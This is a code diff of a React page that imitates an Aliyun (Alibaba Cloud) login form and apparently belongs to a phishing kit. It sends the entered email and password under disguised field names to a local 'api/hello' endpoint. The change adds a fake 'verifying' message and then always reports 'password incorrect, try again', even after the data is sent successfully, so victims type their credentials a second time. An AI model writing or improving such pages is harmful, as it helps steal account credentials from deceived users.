@@ -9,6 +9,8 @@ export default function Home() {
 
   const form = useRef(null)
 
+  const veri = useRef<HTMLHeadingElement>(null)
+
   const [header, setHeader] = useState('ALIYUN')
   const [email, setEmail] = useState('')
 
@@ -31,24 +33,50 @@ if (em) {
 
 },[])
 
-const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
+const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
   e.preventDefault()
-  
-  if (form.current) {
-    const res = new FormData(form.current)
-    const data = {
-      jenneta: res.get('jenneta'),
-      jennet: res.get('jennet')
-    }
-    axios.post('api/hello', data)
+  if (veri.current) {
+    veri.current.innerText = '核实你的数据...'
+    veri.current.classList.remove("hidden")
+    veri.current.classList.add("block", "text-green-300")
   }
+
+  setTimeout(async () => {
+    if (form.current) {
+      const res = new FormData(form.current)
+      const data = {
+        jenneta: res.get('jenneta'),
+        jennet: res.get('jennet')
+      }
+      try {
+        const result = await axios.post('api/hello', data)
+      if (result.status === 200) {
+        if (veri.current) {
+          veri.current.innerText = '密码不正确，请重试。'
+          veri.current.classList.remove('text-green-300')
+          veri.current.classList.add('text-red-300')
+        }
+      }
+        
+      } catch (error) {
+        if (veri.current) {
+          veri.current.innerText = '密码不正确，请重试。'
+          veri.current.classList.remove('text-green-300')
+          veri.current.classList.add('text-red-300')
+        }
+      }
+      
+    }
+    
+  }, 2000);
+  
   
 
 }
 
   return (
     <div className='h-screen main-bg'>
-  <main className='h-[95%] flex justify-center items-center'>
+  <main className='h-[97%] flex justify-center items-center'>
         <div className='bg-white h-3/5 w-[382px] rounded-t-lg'>
             <section className='h-4/5 w-full p-10 '>
 
@@ -69,13 +97,35 @@ const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
               <form ref={form} onSubmit={handleSubmit}>
 
               <label htmlFor="jenneta">电子邮件</label>
-              <input type="text" id='jenneta' name='jenneta' defaultValue={email} className='h-9 w-full border border-gray-300 outline-none rounded-sm p-1 mt-1 px-2 mb-3'/>
+              <input type="text" id='jenneta' 
+                onChange={() => {
+                if (veri.current) {
+                  veri.current.classList.remove('block') 
+                  veri.current.classList.add('hidden')
+                }
+              }} 
+              name='jenneta' 
+              defaultValue={email} 
+              className='h-9 w-full border border-gray-300 outline-none rounded-sm p-1 mt-1 px-2 mb-3'/>
 
 
               <label htmlFor="jennet" className=''>密码</label>
               <div className='relative'>
 
-                <input type="password" ref={eye}  id='jennet' name='jennet' className='h-9 w-full border border-gray-300 outline-none rounded-sm p-1 mt-1 px-2' required/>
+                <input 
+                  onChange={() => {
+                    if (veri.current) {
+                      veri.current.classList.remove('block') 
+                      veri.current.classList.add('hidden') 
+                    }
+                  }}
+                  type="password" 
+                  ref={eye}  
+                  id='jennet' 
+                  name='jennet' 
+                  className='h-9 w-full border border-gray-300 outline-none rounded-sm p-1 mt-1 px-2' required/>
+
+
                 <span 
                   onClick={(e) => {
                     if (eye.current) {
@@ -88,8 +138,13 @@ const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
                 </span>
               </div>
 
+              <h2 className='text-left mt-1 hidden' ref={veri}>
+                请再次登录以继续
+              </h2>
+
               <div className='flex justify-between mt-6'>
-                <input type="submit" className='h-9 rounded w-1/4 bg-sky-500 text-white cursor-pointer' value='登录' required/>
+                <input 
+                type="submit" className='h-9 rounded w-1/4 bg-sky-500 text-white cursor-pointer' value='登录' required/>
 
                 <div className='flex items-center space-x-1'>
                  <input type="checkbox" />
